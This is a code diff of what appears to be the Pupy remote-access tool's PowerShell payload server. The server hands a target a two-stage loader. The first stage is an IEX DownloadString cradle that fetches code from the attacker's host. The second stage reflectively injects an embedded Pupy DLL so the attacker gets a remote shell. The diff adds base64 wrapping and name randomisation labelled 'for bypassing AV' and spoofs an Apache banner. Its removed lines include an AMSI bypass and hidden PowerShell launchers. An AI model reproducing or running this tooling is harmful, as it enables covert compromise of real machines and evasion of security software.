@@ -18,109 +18,111 @@ from modules.lib.windows.powershell import obfuscatePowershellScript, obfs_ps_sc
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 
-#url_random_one = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
-#url_random_two = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
-
-### "url_random_one" and "url_random_two" variables are fixed because if you break you ps1_listener listener, the ps1_listener payload will not be able to get stages -:(
-url_random_one = "eiloShaegae1"
-url_random_two = "IMo8oosieVai"
+# "url_random_one" and "url_random_two_x*" variables are fixed because if you break you ps1_listener listener, the ps1_listener payload will not be able to get stages -:(
+url_random_one = "index.html"
+url_random_two_x86 = "voila.html"
+url_random_two_x64 = "tata.html"
 
 APACHE_DEFAULT_404="""<html><body><h1>It works!</h1>
 <p>This is the default web page for this server.</p>
 <p>The web server software is running but no content has been added, yet.</p>
 </body></html>"""
 
-def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf):
+def getInvokeReflectivePEInjectionWithDLLEmbedded(payload_conf, isX64):
     '''
     Return source code of InvokeReflectivePEInjection.ps1 script with pupy dll embedded
     Ready for executing
     '''
     SPLIT_SIZE = 100000
-    x86InitCode, x86ConcatCode = "", ""
+    initCode, concatCode = "", ""
+    arch = None
     code = """
     $PEBytes = ""
     {0}
     $PEBytesTotal = [System.Convert]::FromBase64String({1})
     Invoke-ReflectivePEInjection -PEBytes $PEBytesTotal -ForceASLR
-    """#{1}=x86dll
-    binaryX86=b64encode(generate_binary_from_template(payload_conf, 'windows', arch='x86', shared=True)[0])
-    binaryX86parts = [binaryX86[i:i+SPLIT_SIZE] for i in range(0, len(binaryX86), SPLIT_SIZE)]
-    for i,aPart in enumerate(binaryX86parts):
-        x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
-        x86ConcatCode += "$PEBytes{0}+".format(i)
-    print(colorize("[+] ","green")+"X86 pupy dll loaded and {0} variables generated".format(i+1))
-    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
-    return obfs_ps_script("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1])))
-
-def create_ps_command(ps_command, force_ps32=False, nothidden=False):
-    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
-    try{{
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
-    }}catch{{}}
-    {}
-    """.format(ps_command)
-
-    if force_ps32:
-        nothiddenArg = ""
-        if nothidden == False: nothiddenArg="-window hidden"
-        command = """$command = '{0}'
-        if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
-        {{
-            $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass {1} -noni -nop -encoded ' + $command
-            IEX $exec
-        }}
-        else
-        {{
-            $exec = [System.Convert]::FromBase64String($command)
-            $exec = [Text.Encoding]::Unicode.GetString($exec)
-            IEX $exec
-        }}""".format(b64encode(ps_command.encode('UTF-16LE')), nothiddenArg)
-
-        if nothidden is True:
-            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
-        else:
-            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
-
+    """#{1}=x86dll or x64dll
+    if isX64 == True:
+        print colorize("[+] ","green")+"x64 dll is loaded in InvokeReflectivePEInjection script..."
+        targetArch = "x64"
     else:
-        if nothidden is True:
-            command = 'powershell.exe -exec bypass -window maximized -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
-        else:
-            command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(ps_command.encode('UTF-16LE')))
-
-    return command
+        print colorize("[+] ","green")+"x86 dll is loaded in InvokeReflectivePEInjection script..."
+        targetArch = "x86"
+    binaryDll=b64encode(generate_binary_from_template(payload_conf, 'windows', arch=targetArch, shared=True)[0])
+    binaryDllparts = [binaryDll[i:i+SPLIT_SIZE] for i in range(0, len(binaryDll), SPLIT_SIZE)]
+    for i,aPart in enumerate(binaryDllparts):
+        initCode += "$PEBytes{0}=\"{1}\"\n".format(i, aPart)
+        concatCode += "$PEBytes{0}+".format(i)
+    print(colorize("[+] ","green")+"{0} variables generated for dll".format(i+1))
+    script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
+    return obfs_ps_script("{0}\n{1}".format(script, code.format(initCode, concatCode[:-1])))
 
 class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
+        self.server_version = "Apache/2.4.27 (Unix)"
+        self.sys_version = ""
         # print self.server.random_reflectivepeinj_name
         if self.path=="/%s" % url_random_one:
+            targetIsX64 = None
             self.send_response(200)
             self.send_header('Content-type','text/html')
             self.end_headers()
-
+            ps_template_stage1 = """
+            if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
+            {{
+            {0}
+            }}
+            else
+            {{
+            {1}
+            }}
+            """
             if self.server.useTargetProxy == True:
                 print colorize("[+] ","green")+"Stage 1 configured for using target's proxy configuration"
                 if not self.server.sslEnabled:
-                    launcher = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
+                    print colorize("[+] ","green")+"Stage 1 configured for NOT using SSL"
+                    launcher_x86 = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x86)
+                    launcher_x64 = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x64)
                 else:
-                    launcher = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
+                    print colorize("[+] ","green")+"Stage 1 configured for using SSL"
+                    launcher_x86 = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x86)
+                    launcher_x64 = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip, self.server.link_port, url_random_two_x64)
             else:
                 print colorize("[+] ","green")+"Stage 1 configured for NOT using target's proxy configuration"
                 if not self.server.sslEnabled:
-                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
+                    print colorize("[+] ","green")+"Stage 1 configured for NOT using SSL"
+                    launcher_x86 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x86)
+                    launcher_x64 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x64)
                 else:
-                    launcher = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two)
-
-            launcher = create_ps_command(launcher, force_ps32=True, nothidden=self.server.nothidden)
-            self.wfile.write(launcher)
+                    print colorize("[+] ","green")+"Stage 1 configured for using SSL"
+                    launcher_x86 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x86)
+                    launcher_x64 = "$w=(New-Object System.Net.WebClient);$w.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object Net.WebClient).DownloadString('https://%s:%s/%s');"%(self.server.link_ip,self.server.link_port,url_random_two_x64)
+            stage1 = ps_template_stage1.format(launcher_x64, launcher_x86)
+            # For bypassing AV
+            stage1 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage1))
+            # Send stage 1 to target
+            self.wfile.write(stage1)
             print colorize("[+] ","green")+"[Stage 1/2] Powershell script served !"
 
-        elif self.path=="/%s" % url_random_two:
+        elif self.path=="/%s" % url_random_two_x86 or self.path=="/%s" % url_random_two_x64:
             self.send_response(200)
-            self.send_header('Content-type','application/octet-stream')
+            #self.send_header('Content-type','application/octet-stream')
+            self.send_header('Content-type','text/html')
             self.end_headers()
             code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read()
             code=code.replace("Invoke-ReflectivePEInjection", self.server.random_reflectivepeinj_name) # seems to bypass some av like avast :o)
-            self.wfile.write(getInvokeReflectivePEInjectionWithDLLEmbedded(self.server.payload_conf))
+            if self.path=="/%s" % url_random_two_x86: 
+                print colorize("[+] ","green")+"remote script is running in a x86 powershell process"
+                targetIsX64 = False
+            else:
+                print colorize("[+] ","green")+"remote script is running in a x64 powershell process"
+                targetIsX64 = True
+            stage2 = getInvokeReflectivePEInjectionWithDLLEmbedded(self.server.payload_conf, isX64=targetIsX64)
+            stage2 = stage2.replace("Invoke-ReflectivePEInjection",''.join(random.choice(string.ascii_uppercase) for _ in range(20)))
+            # For bypassing AV
+            stage2 = "$code=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $code;".format(b64encode(stage2))
+            # Send stage 2 to target
+            self.wfile.write(stage2)
             print colorize("[+] ","green")+"[Stage 2/2] Powershell Invoke-ReflectivePEInjection script (with dll embedded) served!"
             print colorize("[+] ","green")+colorize("%s:You should have a pupy shell in few seconds from this host..."%self.client_address[0],"green")
 
@@ -155,7 +157,6 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
             self.socket = wrap_socket (self.socket, certfile=tmp_cert_path, keyfile=tmp_key_path, server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
             self.tmp_cert_path=tmp_cert_path
             self.tmp_key_path=tmp_key_path
-
 
     def server_close(self):
         try:
